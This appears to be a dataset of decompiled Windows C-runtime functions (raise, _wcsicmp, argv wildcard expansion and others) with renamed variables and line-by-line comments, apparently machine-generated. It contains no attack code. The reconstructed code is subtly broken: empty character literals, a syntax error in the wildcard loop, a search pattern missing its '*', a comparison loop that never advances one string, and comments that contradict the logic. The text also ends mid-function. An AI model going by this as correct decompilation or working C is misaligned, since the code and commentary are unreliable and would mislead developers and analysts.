{"Function Name": "FUN_140018024", "Address": "140018024", "Source Code": "\nfloat FUN_140018024(float input1, float input2, float input3, uint controlParam)\n{\n    int indexVar = 2; // Initialize iVar1 to 2\n    uint valueVar3 = 8; // Initialize uVar3 to 8\n    uint valueVar4; // Declare uVar4\n\n    // Check the value of param_4 to determine the flow of execution\n    if (controlParam == 1) {\n        indexVar = 0; // Set iVar1 to 0 if param_4 is 1\n        valueVar4 = 0; // Set uVar4 to 0\n    } else if (controlParam == 2) {\n        valueVar4 = 0x22; // Set uVar4 to 0x22 if param_4 is 2\n        goto LAB_14001818a; // Jump to the label for further processing\n    } else if (controlParam < 3) {\n        return input3; // Return param_3 if param_4 is less than 3\n    } else if (controlParam < 6) {\n        return (float)FUN_14001d468((uint)input3); // Call FUN_14001d468 and return its result if param_4 is less than 6\n    } else if (controlParam == 6) {\n        valueVar4 = 0x21; // Set uVar4 to 0x21 if param_4 is 6\n    } else if (controlParam == 7) {\n        indexVar = 4; // Set iVar1 to 4 if param_4 is 7\n        valueVar4 = 0x22; // Set uVar4 to 0x22\n        valueVar3 = 0x12; // Set uVar3 to 0x12\n    } else if (controlParam == 9) {\n        indexVar = 3; // Set iVar1 to 3 if param_4 is 9\n        valueVar4 = 0x22; // Set uVar4 to 0x22\n        valueVar3 = 0x11; // Set uVar3 to 0x11\n    } else {\n        return input3; // Return param_3 if none of the conditions are met\n    }\n\nLAB_14001818a: // Label for further processing\n    FUN_14001d318(&DAT_14002b5d0, 0x1d, input3, indexVar, valueVar3, valueVar4, input1, input2, 2); // Call FUN_14001d318 with the specified parameters\n    return input3; // Return param_3\n}\n"}
{"Function Name": "operator()<>", "Address": "1400181b0", "Source Code": "\\*\nulonglong operator()<>(undefined8 input_param, int *lock_resource, undefined8 unused_param, int *unlock_resource)\n{\n    // Extract the lower 6 bits of the global variable DAT_140038080\n    byte bit_mask = (byte)DAT_140038080 & 0x3f;\n\n    // XOR the global variable DAT_140038080 with another global variable _DAT_14003a8a0\n    ulonglong xor_result = DAT_140038080 ^ _DAT_14003a8a0;\n\n    // Acquire a lock on the resource pointed to by param_2\n    __acrt_lock(*lock_resource);\n\n    // Release a lock on the resource pointed to by param_4\n    __acrt_unlock(*unlock_resource);\n\n    // Return the rotated value of uVar2 based on the value of bVar1\n    return xor_result >> bit_mask | xor_result << 0x40 - bit_mask;\n}\n*\\ \n \n\nulonglong operator()<>(undefined8 input_param, int *lock_resource, undefined8 unused_param, int *unlock_resource)\n{\n    byte bit_mask = (byte)DAT_140038080 & 0x3f;\n    ulonglong xor_result = DAT_140038080 ^ _DAT_14003a8a0;\n    __acrt_lock(*lock_resource);\n    __acrt_unlock(*unlock_resource);\n    return xor_result >> bit_mask | xor_result << 0x40 - bit_mask;\n}\n"}
{"Function Name": "__acrt_get_sigabrt_handler", "Address": "1400181f8", "Source Code": "\nvoid __acrt_get_sigabrt_handler(void) // Function declaration for handling SIGABRT\n{\n    undefined1 signal_buffer[8]; // Declare an array of 8 undefined1 type\n    int status_codes[2] = {3, 0}; // Initialize an array of 2 integers with values 3 and 0\n    operator()<>(signal_buffer, (int[]){3, 0, 0, 0}, signal_buffer, status_codes); // Call the operator function with specified parameters\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_140018228", "Address": "140018228", "Source Code": "\nvoid FUN_140018228(undefined8 input_value)\n{\n    // Assign the value of param_1 to the global variable _DAT_14003a890\n    global_var_1 = input_value;\n    \n    // Assign the value of param_1 to the global variable _DAT_14003a898\n    global_var_2 = input_value;\n    \n    // Assign the value of param_1 to the global variable _DAT_14003a8a0\n    global_var_3 = input_value;\n    \n    // Assign the value of param_1 to the global variable _DAT_14003a8a8\n    global_var_4 = input_value;\n}\n"}
{"Function Name": "raise", "Address": "140018248", "Source Code": "\nint __cdecl raise(int signalNumber) // Function to raise a signal based on the signal number\n{\n    ulonglong *signalHandlerPtr; // Pointer to hold the address of signal handler\n    longlong *threadLocalDataPtr; // Pointer to hold thread-local data\n    longlong calculatedAddress; // Variable to hold calculated address\n    longlong loopIteration; // Variable for loop iteration\n    ulonglong signalState; // Variable to hold signal state\n    bool isLockingNeeded = true; // Flag to indicate if locking is needed\n\n    threadLocalDataPtr = (longlong *)0x0; // Initialize thread-local data pointer to null\n    if (signalNumber == 2) { // Check for specific signal number\n        signalHandlerPtr = (ulonglong *)&DAT_14003a890; // Set handler for signal 2\n    } else if (signalNumber == 6) {\n        signalHandlerPtr = (ulonglong *)&DAT_14003a8a0; // Set handler for signal 6\n    } else if (signalNumber == 0xf) {\n        signalHandlerPtr = (ulonglong *)&DAT_14003a8a8; // Set handler for signal 15\n    } else if (signalNumber == 0x15) {\n        signalHandlerPtr = (ulonglong *)&DAT_14003a898; // Set handler for signal 21\n    } else if (signalNumber == 4) { // Check for signal 4\n        threadLocalDataPtr = (longlong *)__acrt_getptd_noexit(); // Get thread-local data\n        if (threadLocalDataPtr == (longlong *)0x0) { // Check if thread-local data is null\n            return -1; // Return error if null\n        }\n        loopIteration = *threadLocalDataPtr; // Get the base address from thread-local data\n        calculatedAddress = DAT_140029050 * 0x10 + loopIteration; // Calculate end address for loop\n        for (; loopIteration != calculatedAddress; loopIteration = loopIteration + 0x10) { // Iterate through signal handlers\n            if (*(int *)(loopIteration + 4) == signalNumber) goto LAB_14001830a; // Check if signal matches\n        }\n        loopIteration = 0; // Reset lVar7 if no match found\n    } else {\n        if ((signalNumber == 8) || (signalNumber == 0xb)) { // Check for signals 8 and 11\n            threadLocalDataPtr = (longlong *)__acrt_getptd_noexit(); // Get thread-local data\n            if (threadLocalDataPtr == (longlong *)0x0) { // Check if thread-local data is null\n                return -1; // Return error if null\n            }\n            loopIteration = *threadLocalDataPtr; // Get the base address from thread-local data\n            calculatedAddress = DAT_140029050 * 0x10 + loopIteration; // Calculate end address for loop\n            for (; loopIteration != calculatedAddress; loopIteration = loopIteration + 0x10) { // Iterate through signal handlers\n                if (*(int *)(loopIteration + 4) == signalNumber) goto LAB_14001830a; // Check if signal matches\n            }\n            loopIteration = 0; // Reset lVar7 if no match found\n        }\n    }\n\nLAB_14001830a: // Label for handling found signal\n    if (loopIteration == 0) { // If no handler found\n        signalHandlerPtr = (ulonglong *)0x0; // Set handler pointer to null\n        goto LAB_14001830f; // Go to unlock section\n    }\n    signalHandlerPtr = (ulonglong *)(loopIteration + 8); // Set handler pointer to found handler\n    isLockingNeeded = false; // Set flag to indicate locking is not needed\n\nLAB_14001830f: // Unlock section\n    if (isLockingNeeded) { // If locking is needed\n        __acrt_lock(3); // Lock the resource\n    }\n    signalState = *signalHandlerPtr; // Get the current state of the signal\n    if (isLockingNeeded) { // If locking is needed\n        byte shiftValue = (byte)DAT_140038080 & 0x3f; // Get shift value from global data\n        signalState = (signalState ^ DAT_140038080) >> shiftValue | (signalState ^ DAT_140038080) << 0x40 - shiftValue; // Rotate the signal state\n    }\n    if (signalState == 1) goto LAB_140018428; // If signal state is 1, go to final handling\n    if (signalState == 0) { // If signal state is 0\n        if (isLockingNeeded) { // If locking is needed\n            __acrt_unlock(3); // Unlock the resource\n        }\n        FUN_140012804(3); // Call a function related to signal handling\n        return ((code *)swi(3))(); // Switch to the signal handler\n    }\n    if (((uint)signalNumber < 0xc) && ((0x910U >> (signalNumber & 0x1fU) & 1) != 0)) { // Check if signal is valid\n        threadLocalDataPtr[1] = 0; // Reset the second element in thread-local data\n        if (signalNumber == 8) { // If signal is 8\n            calculatedAddress = __acrt_getptd(); // Get thread-local data\n            *(undefined4 *)(calculatedAddress + 0x10) = 0x8c; // Set a specific value in thread-local data\n            goto LAB_1400183df; // Go to cleanup section\n        }\n    }\n\nLAB_1400183df: // Cleanup section\n    if (signalNumber == 8) { // If signal is 8\n        calculatedAddress = DAT_140029058 * 0x10 + *threadLocalDataPtr; // Calculate base address for cleanup\n        loopIteration = DAT_140029060 * 0x10 + calculatedAddress; // Calculate end address for cleanup\n        for (; calculatedAddress != loopIteration; calculatedAddress = calculatedAddress + 0x10) { // Iterate through cleanup\n            *(undefined8 *)(calculatedAddress + 8) = 0; // Reset the handler\n        }\n        goto LAB_140018428; // Go to final handling\n    }\n    *signalHandlerPtr = DAT_140038080; // Set the handler to the global state\n\nLAB_140018428: // Final handling section\n    if (isLockingNeeded) { // If locking was needed\n        __acrt_unlock(3); // Unlock the resource\n    }\n    if (signalState != 1) { // If signal state is not 1\n        if (signalNumber == 8) { // If signal is 8\n            (*(code *)PTR__guard_dispatch_icall_1400213e8)(8, *(undefined4 *)(__acrt_getptd() + 0x10)); // Dispatch signal handler\n        } else {\n            (*(code *)PTR__guard_dispatch_icall_1400213e8)(signalNumber); // Dispatch signal handler for other signals\n        }\n    }\n    return 0; // Return success\n}\n"}
{"Function Name": "__acrt_MultiByteToWideChar", "Address": "1400184b4", "Source Code": "\nvoid __acrt_MultiByteToWideChar\n(UINT param_1, DWORD param_2, LPCSTR param_3, int param_4, LPWSTR param_5, int param_6)\n{\n    // Check if param_1 is less than a specific threshold\n    if (param_1 < 0xc436) {\n        // Check if param_1 falls within a certain range or specific values\n        if (((9 < param_1 - 0xc42c) || ((0x2a7U >> (param_1 - 0xc42c & 0x1f) & 1) == 0)) &&\n            (param_1 != 0x2a)) \n            goto LAB_140018507; // Jump to label if conditions are met\n        \n        // Set param_2 to 0 if conditions are satisfied\n        param_2 = 0;\n    }\n    else {\n        // Check if param_1 is not equal to a specific value\n        if (param_1 != 0xd698) {\n            // Check if param_1 is less than another threshold\n            if (param_1 < 0xdeaa) \n                goto LAB_140018507; // Jump to label if conditions are met\n            \n            // Check if param_1 is within a specific range or equals a specific value\n            if ((param_1 < 0xdeb4) || (param_1 == 65000)) \n                goto LAB_1400184d8; // Jump to another label if conditions are met\n            \n            // Check if param_1 is not equal to a specific value\n            if (param_1 != 0xfde9) \n                goto LAB_140018507; // Jump to label if conditions are met\n        }\n        \n        // Mask param_2 with 8\n        param_2 &= 8;\n    }\n    \n    // Label for processing the MultiByteToWideChar function\nLAB_140018507:\n    MultiByteToWideChar(param_1, param_2, param_3, param_4, param_5, param_6); // Call the function with the parameters\n    return; // Exit the function\n}\n"}
{"Function Name": "__acrt_WideCharToMultiByte", "Address": "140018510", "Source Code": "\nvoid __acrt_WideCharToMultiByte\n(uint param_1, uint param_2, LPCWSTR param_3, int param_4, LPSTR param_5, int param_6,\nLPBOOL param_7, LPBOOL param_8)\n{\n    // Extract flags from param_2, masking specific bits\n    DWORD dwFlags = param_2 & 0xffffff7f;\n\n    // Check if param_1 is less than a specific threshold\n    if (param_1 < 0xc436) {\n        // Check if param_1 is within a certain range and meets a condition\n        if ((param_1 - 0xc42c < 10) && ((0x2a7U >> (param_1 - 0xc42c & 0x1f) & 1) != 0))\n            goto LAB_14001857c; // Jump to label if condition is met\n        // Check for a specific value of param_1\n        if (param_1 == 0x2a)\n            goto LAB_14001857c; // Jump to label if condition is met\n    } else {\n        // Check for specific values of param_1 in a higher range\n        if (param_1 == 0xd698 || (0xdea9 < param_1 && (param_1 < 0xdeb4 && param_1 != 65000)))\n            goto LAB_14001857c; // Jump to label if condition is met\n        // Check for another specific value of param_1\n        if (param_1 == 0xfde9)\n            goto LAB_14001857c; // Jump to label if condition is met\n    }\n\nLAB_14001857c:\n    // Check if param_1 is close to 65000 and set pointers to NULL if true\n    if (param_1 - 65000 < 2) {\n        param_8 = (LPBOOL)0x0; // Set param_8 to NULL\n        param_7 = (LPBOOL)0x0; // Set param_7 to NULL\n    }\n    // Call the WideCharToMultiByte function with the provided parameters\n    WideCharToMultiByte(param_1, dwFlags, param_3, param_4, param_5, param_6, (LPCSTR)param_7, param_8);\n    return; // Exit the function\n}\n"}
{"Function Name": "_wcsicmp", "Address": "1400185a8", "Source Code": "\nint __cdecl _wcsicmp(wchar_t *firstString, wchar_t *secondString)\n{\n    // Check if a specific global variable is non-zero\n    if (globalCheckVariable != 0) {\n        // Call the locale-specific wide string comparison function\n        return _wcsicmp_l(firstString, secondString, (_locale_t)0x0);\n    }\n    \n    // Ensure both input strings are not null\n    if (firstString != (wchar_t *)0x0 && secondString != (wchar_t *)0x0) {\n        // Calculate the difference in memory addresses of the two strings\n        longlong addressDifference = (longlong)firstString - (longlong)secondString;\n        wchar_t currentCharFromFirst, currentCharFromSecond;\n        \n        // Loop to compare characters of both strings\n        do {\n            // Get the current character from _Str1, convert to uppercase\n            currentCharFromFirst = *(short *)(addressDifference + (longlong)secondString) + L' ';\n            // Check if the character is outside the range of uppercase letters\n            if (0x19 < (ushort)(*(short *)(addressDifference + (longlong)secondString) - 0x41U)) {\n                currentCharFromFirst = *(wchar_t *)(addressDifference + (longlong)secondString);\n            }\n            // Get the current character from _Str2, convert to uppercase\n            currentCharFromSecond = *secondString + L' ';\n            // Check if the character is outside the range of uppercase letters\n            if (0x19 < (ushort)(*secondString + L'')) {\n                currentCharFromSecond = *secondString;\n            }\n            // Move to the next character in _Str2\n            secondString++;\n        } while (currentCharFromFirst != L'\\0' && currentCharFromFirst == currentCharFromSecond); // Continue until end of string or mismatch\n        \n        // Return the difference between the two characters\n        return (uint)(ushort)currentCharFromFirst - (uint)(ushort)currentCharFromSecond;\n    }\n    \n    // Set the error number for invalid input\n    *__doserrno() = 0x16;\n    // Call an error handling function\n    FUN_14000ecf8();\n    // Return a maximum integer value to indicate an error\n    return 0x7fffffff;\n}\n"}
{"Function Name": "_wcsicmp_l", "Address": "140018640", "Source Code": "\nint __cdecl _wcsicmp_l(wchar_t *str1, wchar_t *str2, _locale_t _Locale)\n{\n    wchar_t char1; // Variable to hold the character from _Str1\n    wchar_t char2; // Variable to hold the character from _Str2\n    int comparisonResult; // Variable to store the result of the comparison\n    ulong *errorPointer; // Pointer to store the error number\n    longlong localeData; // Local variable for locale information\n    localeinfo_struct localeInfo; // Structure to hold locale information\n    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&localeData, (__crt_locale_pointers *)_Locale); // Update the locale information\n    \n    // Check if either string is NULL\n    if ((str1 == (wchar_t *)0x0) || (str2 == (wchar_t *)0x0)) {\n        errorPointer = __doserrno(); // Get the pointer to the DOS error number\n        *errorPointer = 0x16; // Set the error number to 22 (invalid argument)\n        FUN_14000ecf8(); // Call error handling function\n        comparisonResult = 0x7fffffff; // Set iVar3 to the maximum integer value\n    } else {\n        // Check if the locale name is not set\n        if ((localeInfo.locinfo)->locale_name[2] == (wchar_t *)0x0) {\n            longlong stringDifference = (longlong)str1 - (longlong)str2; // Calculate the difference between the two strings\n            do {\n                char1 = *(short *)(stringDifference + (longlong)str2) + L' '; // Get the character from _Str2 and add space\n                // Check if the character is outside the uppercase range\n                if (0x19 < (ushort)(*(short *)(stringDifference + (longlong)str2) - 0x41U)) {\n                    char1 = *(wchar_t *)(stringDifference + (longlong)str2); // Use the original character\n                }\n                char2 = *str2 + L' '; // Get the character from _Str1 and add space\n                // Check if the character is outside the uppercase range\n                if (0x19 < (ushort)(*str2 + L'')) {\n                    char2 = *str2; // Use the original character\n                }\n                str2 = str2 + 1; // Move to the next character in _Str2\n            } while ((char1 != L'\\0') && (char1 == char2)); // Continue while characters are equal and not null\n        } else {\n            do {\n                char1 = _towlower_l(*str1, &localeInfo); // Convert character from _Str1 to lowercase\n                str1 = str1 + 1; // Move to the next character in _Str1\n                char2 = _towlower_l(*str2, &localeInfo); // Convert character from _Str2 to lowercase\n                str2 = str2 + 1; // Move to the next character in _Str2\n                if (char1 == L'\\0') break; // Break if end of string is reached\n            } while (char1 == char2); // Continue while characters are equal\n        }\n        comparisonResult = (uint)(ushort)char1 - (uint)(ushort)char2; // Calculate the difference between the two characters\n    }\n    \n    return comparisonResult; // Return the result of the comparison\n}\n"}
{"Function Name": "_isleadbyte_l", "Address": "140018784", "Source Code": "\nint __cdecl _isleadbyte_l(int character, _locale_t locale)\n{\n    uint isLeadByte; // Variable to store the result indicating if _C is a lead byte\n    longlong localeInfo; // Local variable to hold locale information\n    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&localeInfo, (__crt_locale_pointers *)locale); // Update locale information\n\n    // Check if _C is within the valid range for lead bytes\n    if (character + 1U < 0x101) {\n        // Retrieve the lead byte information from the locale data\n        isLeadByte = *(ushort *)(*(longlong *)(localeInfo + 0x20) + (longlong)character * 2) & 0x8000;\n    } else {\n        isLeadByte = 0; // If _C is out of range, set uVar1 to 0\n    }\n    \n    return isLeadByte; // Return the result indicating if _C is a lead byte\n}\n"}
{"Function Name": "__acrt_get_process_end_policy", "Address": "1400187d0", "Source Code": "\nundefined4 __acrt_get_process_end_policy(void)\n{\n    int termination_method_result[8]; // Array to store the result of the termination method\n\n    // Check if the termination method value is greater than -1\n    if (*(int *)(*(longlong *)((longlong)process_env_block + 0x20) + 8) > -1 &&\n        // Call internal function to get the process termination method\n        __acrt_AppPolicyGetProcessTerminationMethodInternal(termination_method_result), \n        // Check if the termination method indicates a specific policy (1)\n        termination_method_result[0] == 1) {\n        return 0; // Return 0 if the policy is met\n    }\n    \n    return 1; // Return 1 if the policy is not met\n}\n"}
{"Function Name": "common_expand_argv_wildcards<wchar_t>", "Address": "140018820", "Source Code": "\\*\nint __cdecl common_expand_argv_wildcards<wchar_t>(wchar_t **input_arguments,wchar_t ***output_arguments)\n{\n    int return_value; // Variable to store return value from function calls\n    BOOL find_next_result; // Variable to store the result of FindNextFileW\n    errno_t error_code; // Variable to store error codes\n    ulong *dos_error_pointer; // Pointer to store the DOS error number\n    wchar_t *current_argument; // Pointer to the current argument being processed\n    wchar_t *wildcard_character; // Pointer to the wildcard character in the argument\n    HANDLE file_search_handle; // Handle for the file search operation\n    ulonglong allocated_buffers_count; // Variable to store the number of allocated buffers\n    ushort wildcard_character_value; // Variable to store the character value of the wildcard\n    longlong *memory_management_pointer; // Pointer for managing memory allocation\n    ulonglong wildcards_found_count = 0; // Variable for tracking the number of wildcards found\n    wchar_t **expanded_arguments; // Destination pointer for storing expanded arguments\n    wchar_t **local_argument_list; // Local pointer for managing argument list\n    longlong *stack_allocation_pointer = (longlong *)0x0; // Pointer for stack allocation\n    longlong *local_buffer_allocation = (longlong *)0x0; // Pointer for local buffer allocation\n    wchar_t ***output_parameter_copy = output_arguments; // Local copy of the parameter for output\n    _WIN32_FIND_DATAW file_info_structure; // Structure to hold file information\n    ulonglong local_tracking_variable = 0; // Local variable for tracking\n\n    // Check if the output parameter is NULL\n    if (output_arguments == (wchar_t ***)0x0) {\n        dos_error_pointer = __doserrno(); // Get the pointer to the DOS error number\n        *dos_error_pointer = 0x16; // Set the error number to indicate an invalid argument\n        FUN_14000ecf8(); // Call error handling function\n    } else {\n        *output_arguments = (wchar_t **)0x0; // Initialize output parameter to NULL\n        current_argument = *input_arguments; // Get the first argument\n\n        // Loop through each argument until a NULL pointer is encountered\n        while (current_argument != (wchar_t *)0x0) {\n            wildcard_character = wcspbrk(current_argument, L\"?\"); // Find the first wildcard character\n            // If no wildcard is found, copy the argument to the buffer\n            if (wildcard_character == (wchar_t *)0x0) {\n                return_value = copy_and_add_argument_to_buffer<wchar_t>(current_argument, (wchar_t *)0x0, 0, (argument_list<wchar_t> *)&local_buffer_allocation);\n                if (return_value != 0) goto LAB_140018b6d; // Handle error if copying fails\n            } else {\n                // Adjust pointer to find valid wildcard character\n                while ((wildcard_character != current_argument && ((0x2d < (ushort)(*wildcard_character + L'') || ((0x200000000801U >> ((ulonglong)(ushort)(*pwwildcard_character L'') & 0x3f) & 1) == 0))))) {\n                    wildcard_character = wildcard_character - 1; // Move backwards to find valid character\n                }\n                // If a colon is found and it's not the first character, copy the argument\n                if ((*wildcard_character == L':') && (wildcard_character != current_argument + 1)) {\n                    return_value = copy_and_add_argument_to_buffer<wchar_t>(current_argument, (wchar_t *)0x0, 0, (argument_list<wchar_t> *)&local_buffer_allocation);\n                    if (return_value != 0) goto LAB_140018b6d; // Handle error if copying fails\n                }\n                wildcard_character_value = *wildcard_character + L''; // Calculate the character value\n                // Check if the wildcard is valid or if the file search fails\n                if ((0x2d < wildcard_character_value) || (FindFirstFileExW(current_argument, FindExInfoStandard, &file_info_structure, FindExSearchNameMatch, (LPVOID)0x0, 0) == (HANDLE)0xffffffffffffffff)) {\n                    goto LAB_140018b6d; // Handle error if wildcard is invalid\n                }\n                // Start the file search using the wildcard\n                file_search_handle = FindFirstFileExW(current_argument, FindExInfoStandard, &file_info_structure, FindExSearchNameMatch, (LPVOID)0x0, 0);\n                do {\n                    // Skip hidden files and copy valid file names to the buffer\n                    if (((file_info_structure.cFileName[0] != L'.') || ((file_info_structure.cFileName[1] != L'\\0' && ((file_info_structure.cFileName[1] != L'.' || (file_info_structure.cFileName[2] != L'\\0')))))) &&\n                        (return_value = copy_and_add_argument_to_buffer<wchar_t>(file_info_structure.cFileName, current_argument, 0, (argument_list<wchar_t> *)&local_buffer_allocation), return_value != 0)) {\n                        FindClose(file_search_handle); // Close the file handle\n                        goto LAB_140018b6d; // Handle error if copying fails\n                    }\n                    find_next_result = FindNextFileW(file_search_handle, &file_info_structure); // Move to the next file\n                } while (find_next_result != 0); // Continue until no more files are found\n                FindClose(file_search_handle); // Close the file handle after processing\n            }\n            input_arguments = input_arguments + 1; // Move to the next argument\n            current_argument = *input_arguments; // Update the current argument pointer\n        }\n    }\n\n    // Free allocated memory for the argument list\n    allocated_buffers_count = (ulonglong)((longlong)stack_allocation_pointer - (longlong)local_buffer_allocation >> 3);\n    if (allocated_buffers_count != 0) {\n        do {\n            _free_base((LPVOID)*stack_allocation_pointer); // Free each allocated buffer\n            stack_allocation_pointer++; // Move to the next buffer\n        } while (--allocated_buffers_count != 0); // Continue until all buffers are freed\n    }\n    _free_base(local_buffer_allocation); // Free the local buffer\nLAB_140018b6d:\n    return 0; // Return success\n}\n*\\ \n \n\nint __cdecl common_expand_argv_wildcards<wchar_t>(wchar_t **input_arguments,wchar_t ***output_arguments)\n{\n    int return_value;\n    BOOL find_next_result;\n    errno_t error_code;\n    ulong *dos_error_pointer;\n    wchar_t *current_argument;\n    wchar_t *wildcard_character;\n    HANDLE file_search_handle;\n    ulonglong allocated_buffers_count;\n    ushort wildcard_character_value;\n    longlong *memory_management_pointer;\n    ulonglong wildcards_found_count = 0;\n    wchar_t **expanded_arguments;\n    wchar_t **local_argument_list;\n    longlong *stack_allocation_pointer = (longlong *)0x0;\n    longlong *local_buffer_allocation = (longlong *)0x0;\n    wchar_t ***output_parameter_copy = output_arguments;\n    _WIN32_FIND_DATAW file_info_structure;\n    ulonglong local_tracking_variable = 0;\n\n    if (output_arguments == (wchar_t ***)0x0) {\n        dos_error_pointer = __doserrno();\n        *dos_error_pointer = 0x16;\n        FUN_14000ecf8();\n    } else {\n        *output_arguments = (wchar_t **)0x0;\n        current_argument = *input_arguments;\n\n        while (current_argument != (wchar_t *)0x0) {\n            wildcard_character = wcspbrk(current_argument, L\"?\");\n            if (wildcard_character == (wchar_t *)0x0) {\n                return_value = copy_and_add_argument_to_buffer<wchar_t>(current_argument, (wchar_t *)0x0, 0, (argument_list<wchar_t> *)&local_buffer_allocation);\n                if (return_value != 0) goto LAB_140018b6d;\n            } else {\n                while ((wildcard_character != current_argument && ((0x2d < (ushort)(*wildcard_character + L'') || ((0x200000000801U >> ((ulonglong)(ushort)(*pwwildcard_character L'') & 0x3f) & 1) == 0))))) {\n                    wildcard_character = wildcard_character - 1;\n                }\n                if ((*wildcard_character == L':') && (wildcard_character != current_argument + 1)) {\n                    return_value = copy_and_add_argument_to_buffer<wchar_t>(current_argument, (wchar_t *)0x0, 0, (argument_list<wchar_t> *)&local_buffer_allocation);\n                    if (return_value != 0) goto LAB_140018b6d;\n                }\n                wildcard_character_value = *wildcard_character + L'';\n                if ((0x2d < wildcard_character_value) || (FindFirstFileExW(current_argument, FindExInfoStandard, &file_info_structure, FindExSearchNameMatch, (LPVOID)0x0, 0) == (HANDLE)0xffffffffffffffff)) {\n                    goto LAB_140018b6d;\n                }\n                file_search_handle = FindFirstFileExW(current_argument, FindExInfoStandard, &file_info_structure, FindExSearchNameMatch, (LPVOID)0x0, 0);\n                do {\n                    if (((file_info_structure.cFileName[0] != L'.') || ((file_info_structure.cFileName[1] != L'\\0' && ((file_info_structure.cFileName[1] != L'.' || (file_info_structure.cFileName[2] != L'\\0')))))) &&\n                        (return_value = copy_and_add_argument_to_buffer<wchar_t>(file_info_structure.cFileName, current_argument, 0, (argument_list<wchar_t> *)&local_buffer_allocation), return_value != 0)) {\n                        FindClose(file_search_handle);\n                        goto LAB_140018b6d;\n                    }\n                    find_next_result = FindNextFileW(file_search_handle, &file_info_structure);\n                } while (find_next_result != 0);\n                FindClose(file_search_handle);\n            }\n            input_arguments = input_arguments + 1;\n            current_argument = *input_arguments;\n        }\n    }\n\n    allocated_buffers_count = (ulonglong)((longlong)stack_allocation_pointer - (longlong)local_buffer_allocation >> 3);\n    if (allocated_buffers_count != 0) {\n        do {\n            _free_base((LPVOID)*stack_allocation_pointer);\n            stack_allocation_pointer++;\n        } while (--allocated_buffers_count != 0);\n    }\n    _free_base(local_buffer_allocation);\nLAB_140018b6d:\n    return 0;\n}\n"}
{"Function Name": "copy_and_add_argument_to_buffer<wchar_t>", "Address": "140018bec", "Source Code": "\\*\nint __cdecl\ncopy_and_add_argument_to_buffer<wchar_t>\n(wchar_t *param_1,wchar_t *param_2,__uint64 param_3,argument_list<wchar_t> *param_4)\n{\n    errno_t eVar1; // Variable to store error codes from string operations\n    wchar_t *_Dst; // Pointer for the destination buffer\n    undefined8 *puVar3; // Pointer to the current position in the argument list\n    longlong lVar4; // Variable to hold the length of param_1\n    ulonglong uVar6; // Variable to hold the total size needed for the buffer\n    int iVar7 = 0; // Return value initialized to 0\n\n    lVar4 = -1; // Initialize length counter\n    do {\n        lVar4++; // Increment length counter\n    } while (param_1[lVar4] != L'\\0'); // Continue until null terminator is found\n    \n    uVar6 = lVar4 + 2; // Calculate total size needed for the destination buffer\n    if (~param_3 < uVar6) { // Check if the provided buffer size is sufficient\n        return 0xc; // Return error code if not enough space\n    }\n\n    _Dst = (wchar_t *)_calloc_base(param_3 + 1 + uVar6, 2); // Allocate memory for the destination buffer\n    // Copy param_2 to _Dst and check for errors\n    if ((param_3 != 0 && (eVar1 = wcsncpy_s(_Dst, param_3 + 1 + uVar6, param_2, param_3), eVar1 != 0)) ||\n        // Copy param_1 to _Dst and check for errors\n        (eVar1 = wcsncpy_s(_Dst + param_3, param_3 + 1 + uVar6 - param_3, param_1, uVar6), eVar1 != 0)) {\n        _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handling\n        _free_base(_Dst); // Free allocated memory\n        return 0xc; // Return error code\n    }\n\n    puVar3 = *(undefined8 **)(param_4 + 8); // Get the current pointer in the argument list\n    if (puVar3 == *(undefined8 **)(param_4 + 0x10)) { // Check if the argument list is full\n        if (*(longlong *)param_4 == 0) { // If the argument list is empty\n            *(LPVOID *)param_4 = _calloc_base(4, 8); // Allocate initial space for the argument list\n            _free_base((LPVOID)0x0); // Free unused memory\n            puVar3 = *(undefined8 **)param_4; // Update pointer to the new argument list\n            if (puVar3 != (undefined8 *)0x0) { // Check if allocation was successful\n                *(undefined8 **)(param_4 + 8) = puVar3; // Set the start of the argument list\n                *(undefined8 **)(param_4 + 0x10) = puVar3 + 4; // Set the end of the argument list\n            }\n        } else { // If the argument list is not empty\n            uVar6 = (longlong)*(undefined8 **)(param_4 + 0x10) - *(longlong *)param_4 >> 3; // Calculate current size\n            if (uVar6 < 0x8000000000000000) { // Check if the size is within limits\n                LPVOID pvVar2 = _recalloc_base(*(LPVOID *)param_4, uVar6 * 2, 8); // Reallocate memory for the argument list\n                if (pvVar2 != (LPVOID)0x0) { // Check if reallocation was successful\n                    *(LPVOID *)param_4 = pvVar2; // Update pointer to the argument list\n                    *(LPVOID *)(param_4 + 8) = (LPVOID)((longlong)pvVar2 + uVar6 * 8); // Update end pointer\n                    *(LPVOID *)(param_4 + 0x10) = (LPVOID)((longlong)pvVar2 + uVar6 * 0x10); // Update end pointer\n                }\n            }\n            _free_base((LPVOID)0x0); // Free unused memory\n        }\n    }\n\n    *puVar3 = _Dst; // Add the new argument to the list\n    *(longlong *)(param_4 + 8) += 8; // Update the size of the argument list\n    _free_base((LPVOID)0x0); // Free unused memory\n    return iVar7; // Return success\n}\n*\\ \n \n\nint __cdecl\ncopy_and_add_argument_to_buffer<wchar_t>\n(wchar_t *param_1,wchar_t *param_2,__uint64 param_3,argument_list<wchar_t> *param_4)\n{\n    errno_t eVar1;\n    wchar_t *_Dst;\n    undefined8 *puVar3;\n    longlong lVar4;\n    ulonglong uVar6;\n    int iVar7 = 0;\n\n    lVar4 = -1;\n    do {\n        lVar4++;\n    } while (param_1[lVar4] != L'\\0');\n    \n    uVar6 = lVar4 + 2;\n    if (~param_3 < uVar6) {\n        return 0xc;\n    }\n\n    _Dst = (wchar_t *)_calloc_base(param_3 + 1 + uVar6, 2);\n    if ((param_3 != 0 && (eVar1 = wcsncpy_s(_Dst, param_3 + 1 + uVar6, param_2, param_3), eVar1 != 0)) ||\n        (eVar1 = wcsncpy_s(_Dst + param_3, param_3 + 1 + uVar6 - param_3, param_1, uVar6), eVar1 != 0)) {\n        _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n        _free_base(_Dst);\n        return 0xc;\n    }\n\n    puVar3 = *(undefined8 **)(param_4 + 8);\n    if (puVar3 == *(undefined8 **)(param_4 + 0x10)) {\n        if (*(longlong *)param_4 == 0) {\n            *(LPVOID *)param_4 = _calloc_base(4, 8);\n            _free_base((LPVOID)0x0);\n            puVar3 = *(undefined8 **)param_4;\n            if (puVar3 != (undefined8 *)0x0) {\n                *(undefined8 **)(param_4 + 8) = puVar3;\n                